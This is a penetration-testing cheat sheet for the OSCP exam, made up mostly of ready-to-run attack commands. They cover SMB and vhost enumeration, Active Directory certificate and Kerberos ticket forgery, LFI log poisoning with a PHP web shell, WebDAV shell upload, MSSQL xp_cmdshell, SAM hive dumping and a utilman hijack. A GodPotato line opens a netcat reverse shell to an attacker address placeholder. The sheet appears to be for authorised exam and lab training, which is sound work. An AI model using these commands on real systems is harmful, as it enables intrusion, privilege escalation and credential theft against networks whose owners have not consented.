# OSCP Weaponry: Tactical Scenario & Tool Bible

"More is more." This document is the ultimate standalone resource for every tool, scenario, and configuration needed for the OSCP. Never delete a scenario; always expand.

---

## 1. Reconnaissance & Discovery Scenarios

### **Tools: Nmap, ffuf, Gobuster, NetExec**

- **Scenario: Blind Internal Discovery**
  - **Tool**: `netexec smb 10.10.10.0/24 -u '' -p '' --shares`
  - **Goal**: Find "Read" access on shares without credentials.
- **Scenario: VHost Enumeration**
  - **Tool**: `ffuf -u http://domain.local -H "Host: FUZZ.domain.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac`
  - **Goal**: Find dev/internal sites hidden behind the same IP.
- **Scenario: Extension Fuzzing**
  - **Tool**: `ffuf -u http://10.10.10.10/FUZZ -w list.txt -e .php,.txt,.bak,.old,.zip`
  - **Goal**: Find backup files or configuration leaks.

---

## 2. Active Directory (Modern AD Attack Paths)

### **Scenario: AD CS (Enterprise Certificate Services)**
- **Tool**: `Certipy`
- **ESC1 (SAN Impersonation)**:
  - `certipy req -u user@domain -p pass -ca [CA_NAME] -template [TEMPLATE] -upn administrator@domain -dc-ip [IP]`
  - *Why*: The template allows the requester to supply the Subject Name.
- **ESC8 (NTLM Relay to HTTP Enrollment)**:
  - Setup: `impacket-ntlmrelayx -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --adcs --template [TEMPLATE]`
  - Trigger: Use `PetitPotam.exe` or `SpoolSample.exe` to force DC auth to your relay.

### **Scenario: Kerberos Trust & Forest Dominance**
- **Scenario: Child-to-Parent Escalation (Extra SIDs)**
  - **Tool**: `Mimikatz`
  - Command: `kerberos::golden /user:Administrator /domain:[CHILD] /sid:[CHILD_SID] /sids:[PARENT_SID]-519 /rc4:[KRBTGT_HASH] /ptt`
  - *Why*: Adding the Enterprise Admins SID (`-519`) from the parent domain into the ticket.
- **Scenario: Silver Tickets (Service Forgery)**
  - **Tool**: `impacket-ticketer`
  - Command: `impacket-ticketer -nthash [SVC_HASH] -domain-sid [SID] -domain [DOMAIN] -spn [SERVICE/HOST] [USER]`

### **Scenario: Shadow Credentials**
- **Tool**: `PyWhisker` / `Certipy shadow`
- **Scenario**: You have `GenericWrite` on a user but can't reset their password.
- **Command**: `certipy shadow auto -u [ME] -p [PASS] -account [TARGET] -dc-ip [IP]`

---

## 3. Web & Initial Access Scenarios

### **Scenario: LFI to RCE (The Log Poisoning Chain)**
- **Tool**: Burp Suite + Browser.
- **Step 1**: Poison Log: Send request with `User-Agent: <?php system($_GET['cmd']); ?>`
- **Step 2**: Execute: `?page=/var/log/apache2/access.log&cmd=id`
- **Alternative**: Use Wrapper `php://filter/convert.base64-encode/resource=config.php` to steal DB creds.

### **Scenario: WebDAV Hijacking**
- **Tool**: `Cadaver`
- **Scenario**: `PUT` method is enabled.
- **Command**: `cadaver http://10.10.10.10/uploads/` -> `put shell.php`

### **Scenario: SQL Injection to Shell**
- **Tool**: `sqlmap` / `impacket-mssqlclient`
- **MSSQL RCE**:
  - `enable_xp_cmdshell`
  - `xp_cmdshell "whoami"`

---

## 4. Privilege Escalation (Windows & Linux)

### **Scenario: SeImpersonate (Potatoes)**
- **Win 2016/2019**: `PrintSpoofer.exe -c "cmd.exe" -i`
- **Win 2022/Win 11**: `GodPotato.exe -cmd "nc.exe -e cmd.exe [KALI_IP] 443"`

### **Scenario: Linux SUID Automation**
- **Tool**: `auto_suid.sh` (Your custom script).
- **Manual Check**: `find / -perm -4000 -type f 2>/dev/null`
- **GTFOBins**: Always check `find`, `vim`, `nano`, `bash`, `awk`, `sed` for SUID escapes.

### **Scenario: SeBackup / SeRestore**
- **Backup**: `reg save hklm\sam sam.bak` -> `reg save hklm\system system.bak`
- **Restore**: Hijack `C:\Windows\System32\utilman.exe` to get a SYSTEM shell on the login screen.

---

## 5. Pivoting & Tunneling (The Network Bridge)

### **Scenario: Ligolo-ng (Transparent Network Access)**
- **Kali Setup**:
  ```bash
  sudo ip tuntap add user [USER] mode tun ligolo
  sudo ip link set ligolo up
  ```
- **Execution**: Run agent on victim, connect back to Kali port 11601.
- **Setup Route**: `sudo ip route add 10.10.11.0/24 dev ligolo`
- **Why**: You can now `nmap` the internal network directly from Kali.

### **Scenario: SSH Dynamic (SOCKS)**
- **Command**: `ssh -D 1080 user@victim -N`
- **Usage**: Edit `/etc/proxychains4.conf`, add `socks5 127.0.0.1 1080`.
- **Run**: `proxychains nmap -sT -Pn 10.10.11.1`

---

## 6. Utilities & Operational Hardening

### **Scenario: Bypassing Clock Skew (Kerberos)**
- **Tool**: `faketime`
- **Command**: `faketime '2023-12-01 12:00:00' impacket-secretsdump ...`
- **Relative Fix**: `faketime -5m netexec smb ...`

### **Scenario: Cross-Compiling Exploits**
- **Need Windows EXE?**: `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32`

---

## � Required Binary Checklist (Download/Compile NOW)
- [ ] `nc.exe` (32/64)
- [ ] `chisel` (Linux/Win)
- [ ] `GodPotato.exe` / `PrintSpoofer.exe`
- [ ] `Rubeus.exe` (.NET 3.5 & 4.5)
- [ ] `WinPEASany.exe` / `linpeas.sh`
- [ ] `SharpHound.exe`
- [ ] `mimikatz.exe`
- [ ] `SharpGPOAbuse.exe`
- [ ] `SeManageVolumeExploit.exe` (+ its custom DLL)
- [ ] `Ligolo-ng` (Agent & Proxy)
- [ ] `Certipy` (Python package)
- [ ] `bloodyAD` (Python package)
